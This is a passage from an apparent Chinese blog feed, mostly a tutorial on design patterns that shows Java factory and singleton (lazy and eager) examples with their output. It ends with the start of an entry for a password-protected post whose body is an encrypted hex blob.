class="keyword">new</span> <span class="title class_">iPhoneFactory</span>();</span><br><span class="line">        <span class="type">iPadFactory</span> <span class="variable">ipad_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPadFactory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone</span> <span class="variable">iPhone_13</span> <span class="operator">=</span> iphone_factory.createDevice(<span class="number">13</span>);</span><br><span class="line">        <span class="type">iPad</span> <span class="variable">iPad_5</span> <span class="operator">=</span> ipad_factory.createDevice(<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        iPhone_13.showScreen();</span><br><span class="line">        iPad_5.showScreen();</span><br><span class="line">        </span><br><span class="line">        iPhone_13.reboot();</span><br><span class="line">        iPad_5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="三、单例模式（Singleton-Pattern）"><a href="#三、单例模式（Singleton-Pattern）" class="headerlink" title="三、单例模式（Singleton Pattern）"></a>三、单例模式（Singleton Pattern）</h2><p>单例模式即<strong>在一个进程当中，一个类至多仅有一个实例，并提供一个全局访问点</strong>，当一个对象只需要一个全局实例时，便可以使用单例模式（例如 glibc 中的 errno？）</p><p>单例模式能够避免对象的重复创建，从而节约空间，并能避免由于操作不同实例而导致的逻辑错误</p><p>单例模式涉及的对象通常有两种创建方式（名字怪怪的）：</p><h3 id="懒汉方式"><a href="#懒汉方式" class="headerlink" title="懒汉方式"></a>懒汉方式</h3><p>类似于 Linux 下的 lazy-binding 机制，我们并不在一运行程序便创建对象实例，而是等到我们第一次使用该对象时再进行创建</p><p>这是一个🌰：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><p>需要注意的是，为了保证初始化的<strong>线程安全</strong>，InterfaceOutside 类的两个方法都上了锁，且每次都需要判断对象是否存在，这会造成<strong>不可忽视的性能开销</strong>，故通常情况下不会使用懒汉方式来创建单例模式中的对象实例</p><h3 id="饿汉方式"><a href="#饿汉方式" class="headerlink" title="饿汉方式"></a>饿汉方式</h3><p>相比于懒汉方式，饿汉方式会在一开始就将需要用到的实例进行初始化，这种方式便能够直接使用已经生成的对象，而不需要判断对象是否存在</p><p>需要注意的是这种方式无论你在程序中是否需要使用该对象，他都会将该对象进行实例化，这通常会造成额外的开销</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><h2 id="四、建造者模式（Builder-Pattern）"><a href="#四、建造者模式（Builder-Pattern）" class="headerlink" title="四、建造者模式（Builder Pattern）"></a>四、建造者模式（Builder Pattern）</h2><h2 id="五、原型模式"><a href="#五、原型模式" class="headerlink" title="五、原型模式"></a>五、原型模式</h2><h1 id="0x02-结构型模式"><a href="#0x02-结构型模式" class="headerlink" title="0x02.结构型模式"></a>0x02.结构型模式</h1><p>在软件工程中，结构型模式主要关注于<strong>各个元件间的关系</strong>，以此简化设计</p><h2 id="一、适配器模式"><a href="#一、适配器模式" class="headerlink" title="一、适配器模式"></a>一、适配器模式</h2><h2 id="二、装饰器模式"><a href="#二、装饰器模式" class="headerlink" title="二、装饰器模式"></a>二、装饰器模式</h2><h2 id="三、代理模式"><a href="#三、代理模式" class="headerlink" title="三、代理模式"></a>三、代理模式</h2><h2 id="四、外观模式"><a href="#四、外观模式" class="headerlink" title="四、外观模式"></a>四、外观模式</h2><h2 id="五、桥接模式"><a href="#五、桥接模式" class="headerlink" title="五、桥接模式"></a>五、桥接模式</h2><h2 id="六、组合模式"><a href="#六、组合模式" class="headerlink" title="六、组合模式"></a>六、组合模式</h2><h2 id="七、享元模式"><a href="#七、享元模式" class="headerlink" title="七、享元模式"></a>七、享元模式</h2><h1 id="0x03-行为型模式"><a href="#0x03-行为型模式" class="headerlink" title="0x03.行为型模式"></a>0x03.行为型模式</h1><p>创建型模式关注对象如何被创建，结构型模式关注对象间的组织结构，那么我们还缺少什么？从OOP的角度来看，我们似乎还少了一个类的“成员函数”——即对象之间的行为</p><p>在软件工程当中，行为型模式主要关注于对象之间的交流模式并进行实现</p><h2 id="一、策略模式"><a href="#一、策略模式" class="headerlink" title="一、策略模式"></a>一、策略模式</h2><h2 id="二、模板方法"><a href="#二、模板方法" class="headerlink" title="二、模板方法"></a>二、模板方法</h2><h2 id="三、模式观察者模式"><a href="#三、模式观察者模式" class="headerlink" title="三、模式观察者模式"></a>三、模式观察者模式</h2><h2 id="四、迭代子模式"><a href="#四、迭代子模式" class="headerlink" title="四、迭代子模式"></a>四、迭代子模式</h2><h2 id="五、责任链模式"><a href="#五、责任链模式" class="headerlink" title="五、责任链模式"></a>五、责任链模式</h2><h2 id="六、命令模式"><a href="#六、命令模式" class="headerlink" title="六、命令模式"></a>六、命令模式</h2><h2 id="七、备忘录模式"><a href="#七、备忘录模式" class="headerlink" title="七、备忘录模式"></a>七、备忘录模式</h2><h2 id="八、状态模式"><a href="#八、状态模式" class="headerlink" title="八、状态模式"></a>八、状态模式</h2><h2 id="九、访问者模式"><a href="#九、访问者模式" class="headerlink" title="九、访问者模式"></a>九、访问者模式</h2><h2 id="十、中介者模式"><a href="#十、中介者模式" class="headerlink" title="十、中介者模式"></a>十、中介者模式</h2><h2 id="十一、解释器模式"><a href="#十一、解释器模式" class="headerlink" title="十一、解释器模式"></a>十一、解释器模式</h2><h1 id="0x04-并发型模式"><a href="#0x04-并发型模式" class="headerlink" title="0x04.并发型模式"></a>0x04.并发型模式</h1><p>并发型模式主要是随着多线程处理器的不断发展壮大而新出现的一种设计模式，在软件工程中，并发型模式是用来处理多线程编程范式的一类设计模式</p><blockquote><p>to be 🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实👴不会写代码&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="http://blog.arttnba3.cn/categories/CODE/"/>
    
    
    <category term="design pattern" scheme="http://blog.arttnba3.cn/tags/design-pattern/"/>
    
    <category term="设计模式" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x02】Shell之外的往事：深海水母与钻头</title>
    <link href="http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/"/>
    <id>http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/</id>
    <published>2021-12-30T20:30:52.000Z</published>
    <updated>2022-06-26T05:15:08.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="8f2adfa3f9076462f2e37e1fb9fe29e3e1daa5e25ba12776678e796eb0d96747">eef143a3a3e51e2ee0b1e9c84de8c53c9ae7d3e19167c9913280bfaa5b480ce75380276f05b1c7473d4940709ebb324e40c9d1fe866e442b3ca46ca02cb6c70e9e97d2838eb5628d78bb2946acbfa160980a0c5e6db0d178ad5f1573187aa6d210d5dce86476aa5dcf5fa41990d761ea521f041bc020f27294e221eda8d539f6155738117c3faa06feb69d1c0247232be1c10a7d8e5b28321dd148a4d6f23f5ac0ad3ddc7defee7f7d41eed4a68c69b1d633ac1b0dd71f1ca15254fb787a3154bc711dba18c803f96d7813c812d52729ded0e377788a135bc54a56f8dc29a86fafaeab9c5a005401dd6aea8005879ec7322e6fabd1b26819ccbc6b064d2764a9eb80a540ff6b34698f40ddac941d7f471d933e9849f856f935d3d1bd3dc700d88df317f02402d564bc78bc44406e5ec82d16a5d4e3115fe6594f8e7b2365950ed9eee249cb9b054d1201aa52ea0a1ed9931bf4259e5887c53730d5d2b77d59fb31ee0b95751a4d8e36abd7ae271ca5b4b3753f3e8a88a754df370ef352c66b2e281819dd6e9da6186e4531007a7b443b7b9bef0138184d4f5ed5e7fd1cd5894eee01998bebccf1a469424f55d0b637917a5cd59c3e2a30e4476cd6c0a3e807753049327a20f84b47aaf8f092c7612a5c5714d690a6be1f5f986045f3d5db0b912b6b704ba607fb6d9794a37e4c3907a0cbd0bd6ae522401e625487be20706aa54d555588ba8c44d772a44fcc816e552f69470d6dc9e93d9c215cb558e1897b34f19dcd6f89c1221657cce90f15da40d3c6522bd95e41b0d8e299cdb2dc4ff64779943148fdbfc49bfe7a8546370aaa4fbc302200f657402a870dcbe97d89c013ac8e85922d8d3198dd7fbc810edba03e05c94f1252499058a288f30fda96af678d9780359cc40dd6a01c08ae9ed9442514ef652a315949958f490830b74d6bdc664f84400a2d30808b2b81156a339b7148b8d2b5f0955aa6a6bf0629c5e5c4d064870effc9d782ebcb2ad32216aa35403144c0b968d019357f83fdb89136b1f51a4a0f9141db277bfba01d7d235c8f3b0b427aa26d3819f566669d04ff551aa4241ff70905704793e50b266699674b4754b1f98f77f2cbfc491a99c27391dc257318499b55bfad5ffa5d51a133d59a1f821e8fdb0d5d2a4974cc7a693f086f9657d1c8c10afeec425ea2aa55f1ce93696f82e31a121c6c2cff72e30423f58271553e9683000bb29d22aba4039549621e758b4938191c56d56e543d779961a103af16d6225a9b81553460699485c4e9fdcb5dff29918be9652180b347ddec07d8ffee3a0e5db06d7cd25b44973593d2285a12517700db968af9f069d0fdb90d9bdad29c0a657e5b38a6792fc09430c660014c9bb86323ec48e3da218a457cd9af64fd4a6031c612a8b97847235c1277a80b021d510aebe6717d17a0af448403d264b2e71cd3e52c62071cc82624067d59331c029474ff9e83b3b49a125910921129a0ae582d0096ba2a108a8b7e8621a66fa55129fa9fa23d87a0a53d5039c2607b7d5203015cfe32655d846a6e604b43f7365d913fe04a10d645f31cdbfbb3ae41a95b44ba7e7a8808edfc3f0a4412ebbfd69e62ca14f335a980e7c0a483d4bbf866cbec42cf9d337779c8c6a7c47ff1352c5f82ab963b7dca28aa6a64e2e3b0d9819ad6117d37469531ae919c6dc2e19679727547bf3a7a8951a42f820013e3d2eef14e8741dc39f732ba73bd7aab8ce09c9950fd9b7aa1a34a5dcabef8a7b253b3d3bd2e8bb566a58d82501d29b4aad8a5c760b1d7265b7a7041c9106d063cd8599a77be42bde1403574d5f44fd79f3e5c607b36b36802a8170125c3dc199ea2bbec3237054b4b1366eb7d3ec6a4d167b002c1c9ce911ac460e2626f56c3ba1d65ed4396daf4404c147bbe97baab08107b8786c6ab5a58e4e05b21dabc159240191f9b4d41ee66e31089762d020acd42a200cff579c6365e40ed788f5092de5c848b28e7d0968f1d23695c88f26a23de78dce3f34746c3979abdad4c24e25e12440e400fd9ec8c289b583c3f6fe6504990a48c7c9a209e400931b3e0fb63a45e6f522fd84362b70689ddd876d4213e7801aea44d8bc174244baf4570ac9f0f71fb921916c238c958e6bb5c757d8d1b6fdaff549489343ff90497dd5fa550c4bb50e1ab50811624c3fba1b2b54be48eed5ccb9bb34a1d03a0430185aee5b6e8becbf68b4d417eae59ea68b252b1f8dbe4a59906cdfa80636e021ff1852805ce0c2a5358edbd4d1ecffe29b921346037c4d41205de32203249a8dea70072e1af2583ab7e73ef4b7402af06d9f27a6d5b3f433e86bede157f7c35f6b074b75c7c2f21c088f44286e84356db22b7915670ad902f9ba4b7dea3ce59245e876bd31cfeb7ea8e0fb717a63e7171468d98788c01ae5852a1b974ebe7a769af164ee578280246e583e5d646f17da30a51baf24e6971b64c0dcada404a843c4687fbd36d5ad69e6e5e6444b5938f7d913184f7f4914d52f02d09c0bf852589dda105f4c5f1600466bd151f20ed413506dc6afd6593e8ca8fcd6219267dac889faed7b0454fb5d15046a6fcdf2169db4242ff0355ffe2ad504e10d30cf4b8084d74dfb4165a4aeebd6a6fc4397792a3846a38aa7e7d5935321cc438b435ae2b8febedb238b7f227943c2b1c50ec029f51ed34ef488b930a0f2bba4e5eda82ff87efc6f5e673fc7972a15225befdfb5ce0489b374d4538eed4ef80f20d190d0fb5582beeb12e01d365ad7d479a21cd7760231f6055266ef7c4140cb881bd30e8ea9f058124dc4e0cf9dfd234a2fb48a68e2b9d7d439854cc09a9ee720e7208c36351356acebd9e03ba8b50e0d7f5fcbd1f19bb66f5c22aa702155d5b2cd901d9e3909984189372f236b69413b7d0d5e9490323fe0c05db57a01a266d81123b86f3ec3443e0c043b04043aea0c0c017ee7b249d8b9b33544b382dc079e0f117a3473fb020f1c0781e5baf177e64dfb6f2451e54072b966fed655f9831f25f25c47cccc118d0bbdf58297334ef5def36a5a3e630c0ca5b54584e4d400d9a94ce79ab30d2aeaa7a34068b89dc9e085b453320d7bfc17b3549075b9352a7793b1ffe2debd8789f75dcc83ceae8431497612ea1a65750a49aca209c4ad3c2d1c4003b086be5d1e5f0da44f586a68b87ac7fe9b0a3e9cfc388a1f1ad4a09036376fa362d78f8b3cb2c04d7979c36a55c357887fe62b3a37765da428f10524438683387801709d8e219f8fff9c9602fe49e0d221b59e9f2a0a3bb7f32d2e081d2bdb6496986eb2cd1573f748b1db209e0d2a1c3737bbd26f6abcb37c2cc8a29bd18246a6e8ece4175989cd8a831773c14acf1732ad0d009bb22d40782a11bc6df7cfbe105a40e81374f0856137188e4478bd0d10ec6bd528938cc3109b11308ea351a77afd2659a345ab4d9390f0d8cea05896c972f7c768749e4a4db0b16ca28e74166d7dddc3b7f6bdd72550d72bed0e357c8f133d8b25464ad5d345fba6ccc359dbca06144d3e43a9534c60840d719d8ad0ae94675b366654cb209c2e71498291bb6f44a5d1e26e2fa7c487f9250927cb604661ab45283620e192c933a7c1bf8a3e5fab3d03ac482e0b5db9032c849a76b600df969175e9ba041ed33ad39d68b02ffbe3e36f3aea67360ca47fc6e7e82dea15dc7468051c446563cf0dbe7ed8ca473c72d4ed78834881c41ba18f5148697b69682ee2ef14efd757df1b38231a7677cec2141efc295a2117b1b219133a493468bfc3b9c7e4589bb33fce88d9f1bcb9cf606e55b0404ac78e96f86e5363891e0f089400f54b03606525b09bca4d3d7c6e5f1009cc14d85739ec2e3f4f97200f59a67e50af2b9435103b31ff67c4cdb1240433ba26bd04e2d683c3278d0856c1bd743c2678a450ee7aaae11e02aeb9188c531ba293b1f52df426ff20a09e9cddab019827864b56dbad5e114c433c167ee9e3577243be41adad41d315536c08088d34bbdfa5621f5339e027771a1dd9b59f40b469fb83d76e4edd82d4efd5103985f246d856ecd65e24240066b62d2b2a44ef19aa9612fe0c833a831d5474f15775b002daa64507b081f86e6851e1476c50dc6595a2f1a32e548b0e1562df91d572e89e0228f255e61b3569d7f3c126bedfef5f2e66941711a581a80f58d2c1dc7183e071879970b059315295b7a8a3b1a570f809f8c89ee28853125ba8eabff1188dc7e46b82f8a20a82e7860055862564a0fb7392a706d10c4a2bf5ea64e8f92d5338403d00f1a21917d85c214c5eff3aa1411f8618b2ad0ac071fe8109516dfb661f23bb73c36eb39ea0bf6a30792f49e537bcb498d1ec213ac35294775088b08cb3ae6bf80529c4fbfbbc510c4c2f787ab22e943816cd2f5dab0eb9f85e0eb78e394d83711268a54921eb291eb73b5c8e0cbaedf84e450a22167654d80c92679a7627ce78c733c50ec3d34163e3afba3de3c2e17a0fe2eb47616b7a8bae105724908d427a0f069e425a1e48d55f6d2d46c7fe6bea0fed6e3cb7c3ddf30a9880c53a99e3f29ab62a6a6461460c0869abdc9ce734e625903c755d45f176f30ac53182d59a2312874e807ee85d705627a09208ce1536e01fd03c1932d9acf281e72e5c526424037b07168fd9d518b88c1e0a6208c3511fd30dcf711e01443e5afc588d6d4b656d0ee97e27e25655ae2d07297e47642e39b7a54b802b246043d3c698e8cbef3b6e7ab57831e28cf7ded560b7cb3587ba70639bbd3e256c71a59abca99483094ef2ccd49e2e90f7fbca99d896f85641621a89cd36bbb8c280eace4b1351cd461dc2be1124cbe0bd362907da894a7aaa135d8b5d1dbb4135c98e30fee97818217a3003f1c41d1c7afe0b7ece5b034007cab5919917f43e948d42e886afd0a45163774b0b8b621f500306e808769165823e4ec85ffc3a6eab3a50973b2671ab81d2169dc702bba16e9b1318ade868c2661524e74ad9c27053aa789a7b8bb3dc1d255bbaeba321b60d15453de12f565aa349c1697158f8b15cb387d741d861de81bf45b2687de4819294d7a54565a55f04441b046ab7ab606fd8af7614285ea79dafbee43afe691041aad2a089cf436cc1c5ad6d4d9280343a718bfdb1d14a5e1ae7a5366b39219ebeaf80cdacd00fb9646d9550c62400bac48d3d22f5a52a520337cc231396c6894dc48f303e99fa377789985070ad806cb49171e2d494697482a2dc89e1f4fe125511f4a238516fa151d0cdf6bb4d8ac204385a3033ae3a08e70add2ed6ce787781f57e37fe451f1ef39648b97c05d6bc58d2edb0dd8678096f94306e9d1012d3fcb9fad7c1261069068f9db122f2e142f7b9fa9e7aad5cb2fe567d46a13ebd30f32ff0f30a7d5765c9dab82029d5a4eff3bbcf181f822a72094ee119ad479758841d2025859ca73c4131c056edc85b78cf3a826e7f82622aa20da04b0c873d92b337c47efcf6be790e17d4fe5e091b60c25d4bb46c4f36a42d4de0a4eff22b015a0dd656d679878ffae882db29c532b5f38c839872852dc6b88274f7eb30e1e0585b5411131fe993ec18c0ee837d7512df17363a77be149e88240844e5c3366dc7f18478141f675c0ea87352052973bde9bf663656ecb4d2a839ba6f987decdb4493ab7edc87ce12899007af442d83b27e20dc42a83c1202e51df691745b6169a3714453117a95bfab87ad23bb900bce0a090561486a53eacbd9ca6bc37b057fb6945b61ba64108dc1b9ac317e9fd6c120a755133337fa6c79244f1cf49c959df938d5bd099b14f9173324a70cc3dd94d646fe74b242924991231b3420566e8b7b111ce29c62ca655a593360da8716f016ebd8d8d86ca5effa52a1634aab9d9d15d0632c4c39c3c3a4236bded967a4009e83539a77c58019aa25849b5b540352c622485afc8a6bb238828388bbccf30a10051946ac1a86078d28947458b621053012e92fd06abf8fd231632e9f0e7294735ed30abd0cde69ae07e2fcd869d2ab1cb270c4fe65848187938064f3c6f0a26c67e2b0b4175e9967eb07fb189107a44a9af849d9bb6eaa5a7621024964c2c0001a51fcfe24709a19596fe8bd57eeb392ef04d6c9c6b29698dc28498f02b138be9dbc094dd139b4549b74edc3d8b987e73edc677c12a51fdbbcc205bab6740de646afb3fabcc97e10e15b258b1b34452e0c821c854f5424101fc440fc6d229a9d3f14a480f0fa0bec8f7648f08d186bd7e24389a0424e18e713d31d062f4357df8a56084987c6c2bf2891f3e5ede4ad50093d64880963bb82d341e9c5dca06554dd78e1c3857f0084933482345dbdc91bce6f08b977bd0569a7124ec2771dbbf852cdff79c32c1930f56410f4dd5135da92e1947b356d4afa0d2241bca9c6e6dbe94aba42ab621fe5b324f1e8fe9825c028186562ded8a255208a192a0568dae8999bc65ae82e9c6cf3b5e43054526f11b6415eb15588e9495042aa3246e8c756baba5db675d2dae96604be3b7be8fb5fe7d3e87bfae4a143ebf2227dc1c8904752dbd7a5c3d3ace25a6a0753f192c32cdf4b38df560fbb14611d71c277fd3c565b3c3c83179f215e0bcced9d6eed0dd61e5eddc45fe238c2c4ff568b2a01a376d07dde93dbfdacdb4f8c0894a89a1f701720ccbe09fd1a36d3bba59c532b77e48e54eee097de0a5365977c98ef0782739b0aaacb6345256ee00fab04920265f6fbc528d80710158abae5a918d835d0ec480925f4d678f7a4b0ead5402ff14a11e7235893f593997de30e343611e63a2c194958cd61c3b41eead0d77fbfd48cf44615711694f816264d2e7133270